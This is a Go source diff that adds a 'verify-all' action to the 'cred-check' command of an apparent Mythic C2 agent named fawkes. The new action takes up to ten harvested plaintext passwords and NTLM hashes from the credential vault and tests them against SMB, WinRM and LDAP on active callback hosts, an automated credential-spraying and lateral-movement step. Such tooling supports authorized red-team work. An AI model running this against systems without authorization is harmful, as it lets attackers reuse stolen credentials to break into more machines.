@@ -1,19 +1,21 @@
 package agentfunctions
 
 import (
+	"encoding/json"
 	"fmt"
 	"path/filepath"
 	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "cred-check",
-		Description:         "Test credentials against SMB, WinRM, and LDAP on target hosts",
-		HelpString:          "cred-check -hosts <IPs/CIDRs> -username <DOMAIN\\user> -password <pass> [-hash <NTLM>] [-timeout <seconds>]",
-		Version:             1,
+		Description:         "Test credentials against SMB, WinRM, and LDAP on target hosts. Use 'verify-all' action to test all credentials from the vault against discovered hosts.",
+		HelpString:          "cred-check -hosts <IPs/CIDRs> -username <DOMAIN\\user> -password <pass> [-hash <NTLM>] [-timeout <seconds>]\ncred-check -action verify-all",
+		Version:             2,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1110.001", "T1078"},
@@ -21,7 +23,22 @@ func init() {
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS},
 		},
+		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
+			"credVerifyAllDone": credVerifyAllDone,
+		},
 		CommandParameters: []agentstructs.CommandParameter{
+			{
+				Name:             "action",
+				CLIName:          "action",
+				ModalDisplayName: "Action",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Choices:          []string{"check", "verify-all"},
+				Description:      "check: test specific credentials. verify-all: test all vault credentials against discovered hosts.",
+				DefaultValue:     "check",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
 			{
 				Name:                 "hosts",
 				ModalDisplayName:     "Target Hosts",
@@ -32,7 +49,7 @@ func init() {
 				DynamicQueryFunction: getActiveHostList,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
-						ParameterIsRequired: true,
+						ParameterIsRequired: false,
 						GroupName:           "Default",
 					},
 				},
@@ -47,7 +64,7 @@ func init() {
 				DynamicQueryFunction: getCallbackUserList,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
-						ParameterIsRequired: true,
+						ParameterIsRequired: false,
 						GroupName:           "Default",
 					},
 				},
@@ -128,8 +145,19 @@ func init() {
 				Success: true,
 				TaskID:  taskData.Task.ID,
 			}
+
+			action, _ := taskData.Args.GetStringArg("action")
+			if action == "verify-all" {
+				return credCheckVerifyAll(taskData)
+			}
+
 			hosts, _ := taskData.Args.GetStringArg("hosts")
 			username, _ := taskData.Args.GetStringArg("username")
+			if hosts == "" || username == "" {
+				response.Success = false
+				response.Error = "hosts and username are required for check action"
+				return response
+			}
 			display := fmt.Sprintf("hosts: %s, user: %s", hosts, username)
 			response.DisplayParams = &display
 			return response
@@ -158,4 +186,230 @@ func init() {
 			return response
 		},
 	})
+}
+
+// credCheckVerifyAll queries the credential vault and active hosts,
+// then creates parallel cred-check subtasks for each testable credential.
+func credCheckVerifyAll(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
+	response := agentstructs.PTTaskCreateTaskingMessageResponse{
+		Success: true,
+		TaskID:  taskData.Task.ID,
+	}
+
+	// 1. Get all credentials from vault
+	credResp, err := mythicrpc.SendMythicRPCCredentialSearch(mythicrpc.MythicRPCCredentialSearchMessage{
+		TaskID:            taskData.Task.ID,
+		SearchCredentials: mythicrpc.MythicRPCCredentialSearchCredentialData{},
+	})
+	if err != nil || !credResp.Success {
+		response.Success = false
+		response.Error = "Failed to query credential vault"
+		return response
+	}
+	if len(credResp.Credentials) == 0 {
+		response.Success = false
+		response.Error = "No credentials in vault. Run credential harvesting commands first."
+		return response
+	}
+
+	// 2. Get active hosts from callbacks
+	cbResp, err := mythicrpc.SendMythicRPCCallbackSearch(mythicrpc.MythicRPCCallbackSearchMessage{
+		AgentCallbackID: taskData.Callback.AgentCallbackID,
+	})
+	if err != nil || !cbResp.Success {
+		response.Success = false
+		response.Error = "Failed to query active callbacks for host list"
+		return response
+	}
+	seen := make(map[string]bool)
+	var hosts []string
+	for _, cb := range cbResp.Results {
+		if !cb.Active || cb.Ip == "" {
+			continue
+		}
+		if !seen[cb.Ip] {
+			seen[cb.Ip] = true
+			hosts = append(hosts, cb.Ip)
+		}
+	}
+	if len(hosts) == 0 {
+		response.Success = false
+		response.Error = "No active callback hosts found for testing"
+		return response
+	}
+	hostList := strings.Join(hosts, ",")
+
+	// 3. Filter to testable credentials (plaintext or hash)
+	type testCred struct {
+		account  string
+		realm    string
+		password string
+		hash     string
+	}
+	var creds []testCred
+	credSeen := make(map[string]bool)
+	for _, c := range credResp.Credentials {
+		if c.Account == nil || *c.Account == "" {
+			continue
+		}
+		if c.Credential == nil || *c.Credential == "" {
+			continue
+		}
+		credType := ""
+		if c.Type != nil {
+			credType = *c.Type
+		}
+		// Only test plaintext passwords and NTLM hashes
+		if credType != "plaintext" && credType != "hash" {
+			continue
+		}
+		account := *c.Account
+		realm := ""
+		if c.Realm != nil {
+			realm = *c.Realm
+		}
+		key := account + "|" + realm + "|" + credType
+		if credSeen[key] {
+			continue
+		}
+		credSeen[key] = true
+
+		tc := testCred{account: account, realm: realm}
+		if credType == "plaintext" {
+			tc.password = *c.Credential
+		} else {
+			tc.hash = *c.Credential
+		}
+		creds = append(creds, tc)
+	}
+
+	if len(creds) == 0 {
+		response.Success = false
+		response.Error = "No testable credentials (plaintext/hash) in vault"
+		return response
+	}
+
+	// Cap at 10 to avoid excessive network traffic
+	if len(creds) > 10 {
+		creds = creds[:10]
+	}
+
+	// 4. Create parallel subtask group
+	var tasks []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks
+	for _, c := range creds {
+		username := c.account
+		if c.realm != "" {
+			username = c.realm + "\\" + c.account
+		}
+		params := map[string]interface{}{
+			"action":   "check",
+			"hosts":    hostList,
+			"username": username,
+			"timeout":  5,
+		}
+		if c.password != "" {
+			params["password"] = c.password
+		}
+		if c.hash != "" {
+			params["hash"] = c.hash
+		}
+		paramsJSON, _ := json.Marshal(params)
+		tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
+			CommandName: "cred-check",
+			Params:      string(paramsJSON),
+		})
+	}
+
+	completionFunc := "credVerifyAllDone"
+	response.CompletionFunctionName = &completionFunc
+
+	groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
+		mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
+			TaskID:                taskData.Task.ID,
+			GroupName:             "cred_verify_all",
+			GroupCallbackFunction: &completionFunc,
+			Tasks:                 tasks,
+		},
+	)
+	if err != nil || !groupResult.Success {
+		errMsg := "Failed to create subtask group"
+		if err != nil {
+			errMsg = fmt.Sprintf("Failed to create subtask group: %v", err)
+		}
+		response.Success = false
+		response.Error = errMsg
+		return response
+	}
+
+	display := fmt.Sprintf("Verify All: %d credentials against %d hosts", len(creds), len(hosts))
+	response.DisplayParams = &display
+
+	createArtifact(taskData.Task.ID, "Subtask Chain",
+		fmt.Sprintf("Credential Verification: testing %d vault credentials against %s", len(creds), hostList))
+
+	return response
+}
+
+// credVerifyAllDone aggregates results from parallel cred-check subtasks.
+func credVerifyAllDone(
+	taskData *agentstructs.PTTaskMessageAllData,
+	subtaskData *agentstructs.PTTaskMessageAllData,
+	_ *agentstructs.SubtaskGroupName,
+) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	// Search for all subtasks
+	parentID := taskData.Task.ID
+	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
+		TaskID:             parentID,
+		SearchParentTaskID: &parentID,
+	})
+
+	summary := "=== Credential Verification Summary ===\n"
+	validCount := 0
+	failedCount := 0
+	errorCount := 0
+
+	if err == nil && searchResult.Success {
+		for _, task := range searchResult.Tasks {
+			// Get each subtask's output to count success/failure
+			output := getSubtaskResponses(task.ID)
+			successes := strings.Count(output, "SUCCESS")
+			failures := strings.Count(output, "FAILED")
+
+			status := "?"
+			if task.Status == "error" {
+				status = "ERROR"
+				errorCount++
+			} else if successes > 0 {
+				status = fmt.Sprintf("VALID (%d)", successes)
+				validCount++
+			} else {
+				status = fmt.Sprintf("INVALID (%d failed)", failures)
+				failedCount++
+			}
+			summary += fmt.Sprintf("  [%s] %s\n", status, task.DisplayParams)
+		}
+	}
+
+	summary += fmt.Sprintf("\nResults: %d valid, %d invalid, %d errors (out of %d credentials)\n",
+		validCount, failedCount, errorCount, validCount+failedCount+errorCount)
+
+	completed := true
+	response.Completed = &completed
+	response.Stdout = &summary
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   taskData.Task.ID,
+		Response: []byte(summary),
+	})
+
+	logOperationEvent(taskData.Task.ID,
+		fmt.Sprintf("[CREDENTIAL] Verify-all complete on %s: %d valid, %d invalid, %d errors",
+			taskData.Callback.Host, validCount, failedCount, errorCount), false)
+
+	return response
 }
